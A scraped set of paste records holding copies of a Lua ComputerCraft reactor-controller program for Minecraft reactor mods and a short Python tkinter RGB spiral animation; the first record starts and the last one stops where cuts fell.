        mon = peripheral.wrap(monSide)
        sizex, sizey = mon.getSize()
        resetMon()
    end
    return reactor ~= nil
end

--Entry point
function threadMain()
    repeat 
        local good = initialize()
        if (not good) then
            print(""Reactor could not be detected! Trying again"")
            sleep(1)
        else
            print(""Reactor detected! Proceeding with initialization: "")
        end
    until (good)
    initializeVars()
    reDrawButtons()
    saveChanges()
    print(""Reactor initialization done!"")
	sleep(2)
    term.clear()
    term.setCursorPos(1,1)
    os.startThread(resizer)
    os.startThread(routine)
    print(""Reactor Controller Version ""..version)
    print(""Reactor Mod: ""..reactorVersion)
    --main loop
    --local lastTime = 0

    os.startTimer(0.01)
    while (true) do
        local event, p1
        if (monSide ~= nil) then
            event, p1 = t:handleEvents(os.pullEvent(""monitor_touch""))
        else
            event = os.pullEvent(""monitor_touch"")
        end
        if (event == ""button_click"") then
            if (p1 == ""Off"") then
                turnOff()
            elseif (p1 == ""On"") then
                turnOn()
            elseif (p1 == ""+ 10"") then
                minb = math.min(maxb - 10, minb + 10)
            elseif (p1 == ""- 10"") then
                minb = math.max(0, minb - 10)
            elseif (p1 == "" + 10 "") then
                maxb = math.min(100, maxb + 10)
            elseif (p1 == "" - 10 "") then
                maxb = math.max(minb + 10, maxb - 10)
            elseif (isGraph(p1)) then
                toggleGraph(p1)
            end
            saveChanges()
        end
    end
end

--thread stuff below here
local threads = {}
local starting = {}
local eventFilter = nil

rawset(os, ""startThread"", function(fn, blockTerminate)
        table.insert(starting, {
                cr = coroutine.create(fn),
                blockTerminate = blockTerminate or false,
                error = nil,
                dead = false,
                filter = nil
            })
    end)

local function tick(t, evt, ...)
    if t.dead then return end
    if t.filter ~= nil and evt ~= t.filter then return end
    if evt == ""terminate"" and t.blockTerminate then return end

    coroutine.resume(t.cr, evt, ...)
    t.dead = (coroutine.status(t.cr) == ""dead"")
end

local function tickAll()
    if #starting > 0 then
        local clone = starting
        starting = {}
        for _,v in ipairs(clone) do
            tick(v)
            table.insert(threads, v)
        end
    end
    local e
    if eventFilter then
        e = {eventFilter(coroutine.yield())}
    else
        e = {coroutine.yield()}
    end
    local dead = nil
    for k,v in ipairs(threads) do
        tick(v, unpack(e))
        if v.dead then
            if dead == nil then dead = {} end
            table.insert(dead, k - #dead)
        end
    end
    if dead ~= nil then
        for _,v in ipairs(dead) do
            table.remove(threads, v)
        end
    end
end

rawset(os, ""setGlobalEventFilter"", function(fn)
        if eventFilter ~= nil then error(""This can only be set once!"") end
        eventFilter = fn
        rawset(os, ""setGlobalEventFilter"", nil)
    end)

if type(threadMain) == ""function"" then
    os.startThread(threadMain)
else
    os.startThread(function() shell.run(""shell"") end)
end

while #threads > 0 or #starting > 0 do
    tickAll()
end
threadMain()

print(""All threads terminated!"")
print(""Exiting thread manager"")
"
NQm6SykL,# tk_rgb_spiral_test.py,here2share,Python,Sunday 28th of May 2023 03:41:38 PM CDT,"# tk_rgb_spiral_test.py

import tkinter as tk
from PIL import Image, ImageTk, ImageDraw, ImageFilter
import math

ww = 500
hh = 500

root = tk.Tk()
root.title(""tk_rgb_spiral_test"")
root.geometry(""%dx%d+0+0""%(ww,hh))
canvas = tk.Canvas(root, bg='white', width=ww, height=hh)
canvas.pack()

cx, cy = ww//2, hh//2
img = Image.new('RGB', (ww, hh), ""white"")

rgb = [(255, 0, 0), (255, 127, 0), (255, 255, 0), (127, 255, 0), (0, 255, 0), (0, 255, 127), (0, 255, 255), (0, 127, 255),  (0, 0, 255)] * (ww*hh)
rgb = rgb[:(ww*hh)]
rgb.sort()
L = len(rgb)

cXY = []
for y in range(hh):
	for x in range(ww):
		distance = ((cx-x)**2+(cy-y)**2)**0.5
		xy2 = math.atan2(x-cx,y-cy)
		cXY.append(((int(distance), xy2),x,y))
cXY.sort()
cXY = [(x,y) for z,x,y in cXY]
LXY = len(cXY)

while True:
	for i in range(LXY):
		x, y = cXY[i]
		img.putpixel((x, y), rgb[i%L])

	a = rgb[::2]
	b = rgb[1::2]
	rgb = []
	rgb.extend(a)
	rgb.extend(b)
	
	tkimg = ImageTk.PhotoImage(img)
	canvas.create_image((cx, cy), image=tkimg)
	canvas.update()"
qGedBZKM,Untitled,Samsterminator,Lua,Sunday 28th of May 2023 03:17:15 PM CDT,"local tag = ""reactorConfig""
version = ""0.43""
--[[
Program made by DrunkenKas
	See github: https://github.com/Kasra-G/ReactorController/#readme

The MIT License (MIT)
 
Copyright (c) 2021 Kasra Ghaffari
 
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
]]
local reactorType
local mon, monSide, reactorSide
local sizex, sizey, dim, oo, offy
local btnOn, btnOff, invalidDim
local minb, maxb, minrod
local rod, rfLost
local storedLastTick, storedThisTick, lastRFT, maxRFT = 0,0,0,1
local fuelTemp, caseTemp, fuelUsage, waste, capacity = 0,0,0,0,0
local t
local displayingGraphMenu = false
local calibrated = false

--table of which graphs to draw
local graphsToDraw = {}

--table of all the graphs
local graphs = 
{
    ""Energy Buffer"",
    ""Control Level"",
    ""Temperatures"",
}

--marks the offsets for each graph position
local XOffs = 
{
    { 4, true}, 
    {27, true}, 
    {50, true}, 
    {73, true}, 
    {96, true},
}

--Draw a single point
local function drawPoint(x, y, color)
    if (monSide ~= nil) then
        local ix,iy = mon.getCursorPos()
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(color)
        mon.write("" "")
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(ix,iy)
    end
end

--Draw a box with no fill
local function drawBox(size, xoff, yoff, color)
    if (monSide ~= nil) then
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(color)
        for i=0,size[1] - 1 do
            mon.setCursorPos(xoff + i + 1, yoff + 1)
            mon.write("" "")
            mon.setCursorPos(xoff + i + 1, yoff + size[2])
            mon.write("" "")
        end
        for i=0, size[2] - 1 do
            mon.setCursorPos(xoff + 1, yoff + i + 1)
            mon.write("" "")
            mon.setCursorPos(xoff + size[1], yoff + i +1)
            mon.write("" "")
        end
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(colors.black)
    end
end

--Draw a filled box
local function drawFilledBox(size, xoff, yoff, colorOut, colorIn)
    if (monSide ~= nil) then
        local horizLine = """"
        for i=2, size[1] - 1 do
            horizLine  = horizLine.."" ""
        end
        drawBox(size, xoff, yoff, colorOut)
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(colorIn)
        for i=2, size[2] - 1 do
            mon.setCursorPos(xoff + 2, yoff + i)
            mon.write(horizLine)
        end
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Draws text on the screen
local function drawText(text, x1, y1, backColor, textColor)
    if (monSide ~= nil) then
        local x, y = mon.getCursorPos()
        mon.setCursorPos(x1, y1)
        mon.setBackgroundColor(backColor)
        mon.setTextColor(textColor)
        mon.write(text)
        mon.setTextColor(colors.white)
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Helper method for adding buttons
local function addButt(name, callBack, size, xoff, yoff, color1, color2)
    if (monSide ~= nil) then
        t:add(name, callBack, 
            xoff + 1, yoff + 1, 
            size[1] + xoff, size[2] + yoff, 
            color1, color2)	
    end
end

--adds buttons
local function addButtons()
    if (sizey == 24) then
        oo = 1
    end
    addButt(""On"", nil, {8, 3}, dim + 7, 3 + oo,
        colors.red, colors.lime)
    addButt(""Off"", nil, {8, 3}, dim + 19, 3 + oo,
        colors.red, colors.lime)
    if (btnOn) then
        t:toggleButton(""On"")
    else
        t:toggleButton(""Off"")
    end
    if (sizey > 24) then
        addButt(""+ 10"", nil, {8, 3}, dim + 7, 14 + oo,
            colors.purple, colors.pink)
        addButt("" + 10 "", nil, {8, 3}, dim + 19, 14 + oo,
            colors.magenta, colors.pink)
        addButt(""- 10"", nil, {8, 3}, dim + 7, 18 + oo,
            colors.purple, colors.pink)
        addButt("" - 10 "", nil, {8, 3}, dim + 19, 18 + oo,
            colors.magenta, colors.pink)
    end
end

--Resets the monitor
local function resetMon()
    if (monSide ~= nil) then
        mon.setBackgroundColor(colors.black)
        mon.clear()
        mon.setTextScale(0.5)
        mon.setCursorPos(1,1)
    end
end

local function getPercPower()
    return storedThisTick / capacity * 100
end

local function rnd(num, dig)
    return math.floor(10 ^ dig * num) / (10 ^ dig)
end

local function getEfficiency()
    return lastRFT / fuelUsage
end

local function getGenRatio()
    return lastRFT / capacity
end

local function format(num)
    if (num >= 1000000000) then
        return string.format(""%7.3f G"", num / 1000000000)
    elseif (num >= 1000000) then
        return string.format(""%7.3f M"", num / 1000000)
    elseif (num >= 1000) then
        return string.format(""%7.3f K"", num / 1000)
    elseif (num >= 1) then
        return string.format(""%7.3f "", num)
    elseif (num >= .001) then
        return string.format(""%7.3f m"", num * 1000)
    elseif (num >= .000001) then
        return string.format(""%7.3f u"", num * 1000000)
    else
        return string.format(""%7.3f "", 0)
    end
end

local function getAvailableXOff()
    for i,v in pairs(XOffs) do
        if (v[2] and v[1] < dim) then
            v[2] = false
            return v[1]
        end
    end
    return -1
end

local function getXOff(num)
    for i,v in pairs(XOffs) do
        if (v[1] == num) then
            return v
        end
    end
    return nil
end

local function disableGraph(name)
    if (graphsToDraw[name] ~= nil) then
        if (displayingGraphMenu) then
            t:toggleButton(name)
        end
        getXOff(graphsToDraw[name])[2] = true
        graphsToDraw[name] = nil
    end
end

local function addGraphButtons()
    offy = oo - 14
    for i,v in pairs(graphs) do
        addButt(v, nil, {20, 3},
            dim + 7, offy + i * 3 - 1,
            colors.red, colors.lime)
        if (graphsToDraw[v] ~= nil) then
            t:toggleButton(v)
        end
    end
end

local function drawGraphButtons()
    drawBox({sizex - dim - 3, oo - offy - 1}, 
        dim + 2, offy, colors.orange)
    drawText("" Graph Controls "",
        dim + 7, offy + 1,
        colors.black, colors.orange)
end

local function isGraph(name)
    for i,v in pairs(graphs) do
        if (v == name) then
            return true
        end
    end
    return false
end

local function getGraph(num)
    for i,v in pairs(graphsToDraw) do
        if (v == num) then
            return i
        end
    end
    return nil
end

local function enableGraph(name)
    if (graphsToDraw[name] == nil) then
        local e = getAvailableXOff()
        if (e ~= -1) then
            graphsToDraw[name] = e
            if (displayingGraphMenu) then
                t:toggleButton(name)
            end
        end
    end
end

local function toggleGraph(name)
    if (graphsToDraw[name] == nil) then
        enableGraph(name)
    else
        disableGraph(name)
    end
end

local function drawEnergyBuffer(xoff)
    local srf = sizey - 9
    local off = xoff
    local right = off + 19 < dim
    local poff = right and off + 15 or off - 6

    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    local pwr = math.floor(getPercPower() / 100 
        * (srf))
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rndpw = rnd(getPercPower(), 2)
    local color = (rndpw < maxb and rndpw > minb) and colors.green
    or (rndpw >= maxb and colors.orange or colors.blue)
    if (pwr > 0) then
        drawFilledBox({13, pwr + 1}, off, srf + 4 - pwr,
            color, color)
    end
    --drawPoint(off + 14, srf + 5 - pwr, pwr > 0 and color or colors.red)
    drawText(string.format(right and ""%.2f%%"" or ""%5.2f%%"", rndpw), poff, srf + 5 - pwr,
        colors.black, color)
    drawText(""Energy Buffer"", off + 1, 4,
        colors.black, colors.orange)
    drawText(format(storedThisTick)..""RF"", off + 1, srf + 5 - pwr,
        pwr > 0 and color or colors.red, colors.black)
end

local function drawControlLevel(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rodTr = math.floor(rod / 100 
        * (srf))
    drawText(""Control Level"", off + 1, 4,
        colors.black, colors.orange)
    if (rodTr > 0) then
        drawFilledBox({9, rodTr}, off + 2, 5,
            colors.orange, colors.orange)
    end
    drawText(string.format(""%6.2f%%"", rod), off + 4, rodTr > 0 and rodTr + 5 or 6,
        rodTr > 0 and colors.orange or colors.red, colors.black)

end

local function drawTemperatures(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off, 4, colors.gray)
    --drawFilledBox({12, srf}, off, 5,
    --	colors.red, colors.red)

    local fuelRnd = math.floor(fuelTemp - 273)
    local caseRnd = math.floor(caseTemp - 273)
    local fuelTr = math.floor(fuelRnd / 2000 
        * (srf))
    local caseTr = math.floor(caseRnd / 2000
        * (srf))
    drawText("" Case "", off + 2, 5,
        colors.gray, colors.lightBlue)
    drawText("" Fuel "", off + 9, 5,
        colors.gray, colors.magenta)
    if (fuelTr > 0) then
        fuelTr = math.min(fuelTr, srf)
        drawFilledBox({6, fuelTr}, off + 8, srf + 5 - fuelTr,
            colors.magenta, colors.magenta)

        drawText(string.format(""%4sC"", fuelRnd ..""""), 
            off + 10, srf + 6 - fuelTr,
            colors.magenta, colors.black)
    else
        drawText(string.format(""%4sC"", fuelRnd ..""""), 
            off + 10, srf + 5,
            colors.black, colors.magenta)
    end

    if (caseTr > 0) then
        caseTr = math.min(caseTr, srf)
        drawFilledBox({6, caseTr}, off + 1, srf + 5 - caseTr,
            colors.lightBlue, colors.lightBlue)
        drawText(string.format(""%4sC"", caseRnd ..""""), 
            off + 3, srf + 6 - caseTr,
            colors.lightBlue, colors.black)
    else
        drawText(string.format(""%4sC"", caseRnd ..""""), 
            off + 3, srf + 5,
            colors.black, colors.lightBlue)
    end

    drawText(""Temperatures"", off + 2, 4,
        colors.black, colors.orange)
    drawBox({1, srf}, off + 7, 5,
        colors.gray)
end

local beg
local function drawGraph(name, offset)
    if (name == ""Energy Buffer"") then
        drawEnergyBuffer(offset)
    elseif (name == ""Control Level"") then
        drawControlLevel(offset)
    elseif (name == ""Temperatures"") then
        drawTemperatures(offset)
    end
end

local function drawGraphs()
    for i,v in pairs(graphsToDraw) do
        if (v + 15 < dim) then
            drawGraph(i,v)
        end
    end
end

local function drawStatus()
    if (dim > -1) then
        drawBox({dim, sizey - 2},
            1, 1, colors.lightBlue)
        drawText("" Reactor Graphs "", dim - 18, 2, 
            colors.black, colors.lightBlue)
        drawGraphs()
    end
end

local function drawControls()
    if (sizey == 24) then
        drawBox({sizex - dim - 3, 9}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawText(""Reactor ""..(btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    else
        drawBox({sizex - dim - 3, 23}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawFilledBox({20, 3}, dim + 7, 8 + oo,
            colors.red, colors.red)
        drawFilledBox({(maxb - minb) / 5, 3}, 
            dim + 7 + minb / 5, 8 + oo, 
            colors.green, colors.green)
        drawText(string.format(""%3s"", minb..""%""), dim + 6 + minb / 5, 12 + oo,
            colors.black, colors.purple)
        drawText(maxb..""%"", dim + 8 + maxb / 5, 12 + oo,
            colors.black, colors.magenta)
        drawText(""Buffer Target Range"", dim + 8, 8 + oo,
            colors.black, colors.orange)
        drawText(""Min"", dim + 10, 14 + oo,
            colors.black, colors.purple)
        drawText(""Max"", dim + 22, 14 + oo,
            colors.black, colors.magenta)
        drawText(""Reactor "".. (btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    end
end

local function drawStatistics()
    local oS = sizey - 13
    drawBox({sizex - dim - 3, sizey - oS - 1}, dim + 2, oS,
        colors.blue)
    drawText("" Reactor Statistics "", dim + 7, oS + 1,
        colors.black, colors.blue)

    --statistics
    drawText(""Generating : ""
        ..format(lastRFT)..""RF/t"", dim + 5, oS + 3,
        colors.black, colors.green)
    drawText(""RF Drain   ""
        ..(storedThisTick <= lastRFT and ""> "" or "": "")
        ..format(rfLost)
        ..""RF/t"", dim + 5, oS + 5,
        colors.black, colors.red)
    drawText(""Efficiency : ""
        ..format(getEfficiency())..""RF/B"", 
        dim + 5, oS + 7,
        colors.black, colors.green)
    drawText(""Fuel Usage : ""
        ..format(fuelUsage)
        ..""B/t"", dim + 5, oS + 9,
        colors.black, colors.green)
    drawText(""Waste      : ""
        ..string.format(""%7d mB"", waste),
        dim + 5, oS + 11,
        colors.black, colors.green)
end

--Draw a scene
local function drawScene()
    if (monSide ~= nil) then
        t:draw()
    end
    if (displayingGraphMenu) then
        drawGraphButtons()
    end
    if (invalidDim) then
        if (monSide ~= nil) then
            mon.write(""Invalid Monitor Dimensions"")
        end
    else
        drawControls()
        drawStatus()
        drawStatistics()
    end
end

--Redraws all the buttons
--Updates the important values
local function reDrawButtons()
    if (monSide ~= nil) then
        t = touchpoint.new(monSide)
        sizex, sizey = mon.getSize()
        oo = sizey - 37
        dim = sizex - 33
    end
    --print(sizex, sizey)
    if (sizex == 36) then
        dim = -1
    end
    if (pcall(addGraphButtons)) then
        drawGraphButtons()
        displayingGraphMenu = true
    else
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        displayingGraphMenu = false
    end
    local rtn = pcall(addButtons)
    if (not rtn) then
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        invalidDim = true
    else
        invalidDim = false
    end
    --t:draw()
end

local function setRods(level)
    level = math.max(level, 0)
    level = math.min(level, 100)
    reactor.setAllControlRodLevels(level)
end

--Turns off the reactor
local function turnOff()
    if (btnOn) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = true
        btnOn = false
        setRods(100)
        reactor.setActive(false)
    end
end

--Turns on the reactor
local function turnOn()
    if (btnOff) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = false
        btnOn = true
        reactor.setActive(true)
    end
end

--adjusts the level of the rods
local function adjustRods()
    local currentRF = storedThisTick
    local diffb = maxb - minb
    maxRF = maxb / 100 * capacity
    minRF = minb / 100 * capacity
    diffRF = diffb / 100 * capacity
    local diffr = diffb / 100
    local targetRFT = rfLost
    local currentRFT = lastRFT
    local diffRFT = currentRFT/targetRFT
    local targetRF = diffRF / 2 + minRF

    currentRF = math.min(currentRF, maxRF)
    local equation1 = math.min((currentRF - minRF)/diffRF, 1)
    equation1 = math.max(equation1, 0)
    
	local rodLevel = rod
    if (storedThisTick < minRF) then
        rodLevel = 0
    elseif ((storedThisTick < maxRF and storedThisTick > minRF)) then
        equation1 = equation1 * (currentRF / targetRF) --^ 2
        equation1 = equation1 * diffRFT --^ 5
        equation1 = equation1 * 100

        rodLevel = equation1
    elseif (storedThisTick > maxRF) then
        rodLevel = 100
    end
    setRods(rodLevel)
end

--Saves the configuration of the reactor controller
local function saveChanges()
    local file = fs.open(tag.."".txt"", ""w"")
    file.writeLine(calibrated)
    if (calibrated) then
        file.writeLine(capacity)
        file.writeLine(maxRFT)
    end
    file.writeLine(maxb)
    file.writeLine(minb)
    file.writeLine(rod)
    file.writeLine(btnOn)
    for i,v in pairs(XOffs) do
        local graph = getGraph(v[1])
        graph = (graph == nil and ""nil"" or graph)
        file.writeLine(graph)
        file.writeLine(v[1])
    end
    file.close()
end

--returns the side that a given peripheral type is connected to
local function getPeripheral(name)
    for i,v in pairs(peripheral.getNames()) do
        if (peripheral.getType(v) == name) then
            return v
        end
    end
    return """"
end

local function updateStats()
    storedLastTick = storedThisTick
    if (reactorVersion == ""Big Reactors"") then
        storedThisTick = reactor.getEnergyStored()
        lastRFT = reactor.getEnergyProducedLastTick()
        rod = reactor.getControlRodLevel(0)
        fuelUsage = reactor.getFuelConsumedLastTick() / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Extreme Reactors"") then
        local bat = reactor.getEnergyStats()
        local fuel = reactor.getFuelStats()

        storedThisTick = bat.energyStored
        lastRFT = bat.energyProducedLastTick
        capacity = bat.energyCapacity
        rod = reactor.getControlRodLevel(0)
        fuelUsage = fuel.fuelConsumedLastTick / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Bigger Reactors"") then
   		storedThisTick = reactor.battery().stored()
        lastRFT = reactor.battery().producedLastTick()
        capacity = reactor.battery().capacity()
        rod = reactor.getControlRod(0).level()
        fuelUsage = reactor.fuelTank().burnedLastTick() / 1000
        waste = reactor.fuelTank().waste()
        fuelTemp = reactor.fuelTemperature()
        caseTemp = reactor.casingTemperature()
    end
    rfLost = lastRFT + storedLastTick - storedThisTick
end

--Updates statistics and adjusts the rods
local function compute()
    updateStats()
    if (btnOn) then
        adjustRods()
    end
end

--The main routine that runs each tick
function routine()
    while (true) do
        --[[
        If the graphs are drawn every tick, everything
        just breaks.
        If the graphs are drawn every 2nd tick, my
        RFLost calculation is wrong every time
        If the graphs are drawn every 3rd tick, my
        RFLost calculation is wrong sometimes

        THIS MAKES NO SENSE
        ]]
        for i = 1,4 do	
            compute()
            sleep(0.01)
        end
        resetMon()
        drawScene()
    end
end

--Manages window resizing events
function resizer()
    while (true) do
        local event = os.pullEvent(""monitor_resize"")
        if (event == ""monitor_resize"") then
            reDrawButtons()
        end
    end
end

local function calibrate()
    setRods(0)
    reactor.setActive(true)
    sleep(15)
    updateStats()
    setRods(100)
    reactor.setActive(false)
    if (reactorVersion == ""Big Reactors"") then
        capacity = storedThisTick
    end
    maxRFT = lastRFT
end

--Initialize variables from either a config file or the defaults
local function initializeVars()
    invalidDim = false
    if (not fs.exists(tag.."".txt"")) then
        print(""Config file ""..tag.."" not found, generating a default one!"")
        repeat
            print(""The program can be optionally calibrated. Proceed? (y/n) "")
            local response = read()
            if (response == ""n"") then
                print(""Calibration skipped. Some functions may be unavailable"")
                calbrated = false
            elseif (response == ""y"") then
                print(""Beginning 15 second calibration, do not turn off the reactor!"")
                calibrate()
                print(""Calibrated!"")
                calibrated = true
            end
        until response == ""y"" or response == ""n""
        
        maxb = 70
        minb = 30
        rod = 80
        btnOn = false
        if (monSide == nil) then
            btnOn = true
        end
        dim = sizex - 33
        oo = sizey - 37
        enableGraph(""Energy Buffer"")
        enableGraph(""Control Level"")
        enableGraph(""Temperatures"")
    else
        local file = fs.open(tag.."".txt"", ""r"")
        print(""Config file ""..tag.."" found! Using configurated settings"")

        calibrated = file.readLine() == ""true""
        
        --read calibration information
        if (calibrated) then
        	capacity = tonumber(file.readLine())
        	maxRFT = tonumber(file.readLine())
        end
        maxb = tonumber(file.readLine())
        minb = tonumber(file.readLine())
        rod = tonumber(file.readLine())
        btnOn = file.readLine() == ""true""

        --read Graph data
        for i in pairs(XOffs) do
            local graph = file.readLine()
            local v1 = tonumber(file.readLine())
            local v2 = true
            if (graph ~= ""nil"") then
                v2 = false
                graphsToDraw[graph] = v1
            end

            XOffs[i] = {v1, v2}

        end
        file.close()
    end
    btnOff = not btnOn
    diffb = maxb - minb
    reactor.setActive(btnOn)
end

--Initialize program
local function initialize()
    term.setBackgroundColor(colors.black)
    term.clear()
    term.setCursorPos(1,1)
    os.loadAPI(""/usr/apis/touchpoint.lua"")
    reactorSide = getPeripheral(""BiggerReactors_Reactor"")
    reactorVersion = ""Bigger Reactors""
    reactor = peripheral.wrap(reactorSide)
    if (reactor == nil) then
        reactorSide = getPeripheral(""BigReactors-Reactor"")
        reactor = peripheral.wrap(reactorSide)
        if (reactor.mbIsConnected ~= nil) then
            reactorVersion = ""Extreme Reactors""
        else
            reactorVersion = ""Big Reactors""
        end
    end
    if (reactor == nil) then
        reactorSide = getPeripheral(""bigger-reactor"")
        reactor = peripheral.wrap(reactorSide)
		reactorVersion = ""Big Reactors""
    end
    monSide = getPeripheral(""monitor"")
    monSide = monSide == """" and nil or monSide
    sizex, sizey = 36, 38
    if (monSide ~= nil) then
        mon = peripheral.wrap(monSide)
        sizex, sizey = mon.getSize()
        resetMon()
    end
    return reactor ~= nil
end

--Entry point
function threadMain()
    repeat 
        local good = initialize()
        if (not good) then
            print(""Reactor could not be detected! Trying again"")
            sleep(1)
        else
            print(""Reactor detected! Proceeding with initialization: "")
        end
    until (good)
    initializeVars()
    reDrawButtons()
    saveChanges()
    print(""Reactor initialization done!"")
	sleep(2)
    term.clear()
    term.setCursorPos(1,1)
    os.startThread(resizer)
    os.startThread(routine)
    print(""Reactor Controller Version ""..version)
    print(""Reactor Mod: ""..reactorVersion)
    --main loop
    --local lastTime = 0

    os.startTimer(0.01)
    while (true) do
        local event, p1
        if (monSide ~= nil) then
            event, p1 = t:handleEvents(os.pullEvent(""monitor_touch""))
        else
            event = os.pullEvent(""monitor_touch"")
        end
        if (event == ""button_click"") then
            if (p1 == ""Off"") then
                turnOff()
            elseif (p1 == ""On"") then
                turnOn()
            elseif (p1 == ""+ 10"") then
                minb = math.min(maxb - 10, minb + 10)
            elseif (p1 == ""- 10"") then
                minb = math.max(0, minb - 10)
            elseif (p1 == "" + 10 "") then
                maxb = math.min(100, maxb + 10)
            elseif (p1 == "" - 10 "") then
                maxb = math.max(minb + 10, maxb - 10)
            elseif (isGraph(p1)) then
                toggleGraph(p1)
            end
            saveChanges()
        end
    end
end

--thread stuff below here
local threads = {}
local starting = {}
local eventFilter = nil

rawset(os, ""startThread"", function(fn, blockTerminate)
        table.insert(starting, {
                cr = coroutine.create(fn),
                blockTerminate = blockTerminate or false,
                error = nil,
                dead = false,
                filter = nil
            })
    end)

local function tick(t, evt, ...)
    if t.dead then return end
    if t.filter ~= nil and evt ~= t.filter then return end
    if evt == ""terminate"" and t.blockTerminate then return end

    coroutine.resume(t.cr, evt, ...)
    t.dead = (coroutine.status(t.cr) == ""dead"")
end

local function tickAll()
    if #starting > 0 then
        local clone = starting
        starting = {}
        for _,v in ipairs(clone) do
            tick(v)
            table.insert(threads, v)
        end
    end
    local e
    if eventFilter then
        e = {eventFilter(coroutine.yield())}
    else
        e = {coroutine.yield()}
    end
    local dead = nil
    for k,v in ipairs(threads) do
        tick(v, unpack(e))
        if v.dead then
            if dead == nil then dead = {} end
            table.insert(dead, k - #dead)
        end
    end
    if dead ~= nil then
        for _,v in ipairs(dead) do
            table.remove(threads, v)
        end
    end
end

rawset(os, ""setGlobalEventFilter"", function(fn)
        if eventFilter ~= nil then error(""This can only be set once!"") end
        eventFilter = fn
        rawset(os, ""setGlobalEventFilter"", nil)
    end)

if type(threadMain) == ""function"" then
    os.startThread(threadMain)
else
    os.startThread(function() shell.run(""shell"") end)
end

while #threads > 0 or #starting > 0 do
    tickAll()
end

print(""All threads terminated!"")
print(""Exiting thread manager"")
"
rsM1MDZA,Untitled,Samsterminator,Lua,Sunday 28th of May 2023 03:16:10 PM CDT,"local tag = ""reactorConfig""
version = ""0.43""
--[[
Program made by DrunkenKas
	See github: https://github.com/Kasra-G/ReactorController/#readme

The MIT License (MIT)
 
Copyright (c) 2021 Kasra Ghaffari
 
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
]]
local reactorType
local mon, monSide, reactorSide
local sizex, sizey, dim, oo, offy
local btnOn, btnOff, invalidDim
local minb, maxb, minrod
local rod, rfLost
local storedLastTick, storedThisTick, lastRFT, maxRFT = 0,0,0,1
local fuelTemp, caseTemp, fuelUsage, waste, capacity = 0,0,0,0,0
local t
local displayingGraphMenu = false
local calibrated = false

--table of which graphs to draw
local graphsToDraw = {}

--table of all the graphs
local graphs = 
{
    ""Energy Buffer"",
    ""Control Level"",
    ""Temperatures"",
}

--marks the offsets for each graph position
local XOffs = 
{
    { 4, true}, 
    {27, true}, 
    {50, true}, 
    {73, true}, 
    {96, true},
}

--Draw a single point
local function drawPoint(x, y, color)
    if (monSide ~= nil) then
        local ix,iy = mon.getCursorPos()
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(color)
        mon.write("" "")
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(ix,iy)
    end
end

--Draw a box with no fill
local function drawBox(size, xoff, yoff, color)
    if (monSide ~= nil) then
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(color)
        for i=0,size[1] - 1 do
            mon.setCursorPos(xoff + i + 1, yoff + 1)
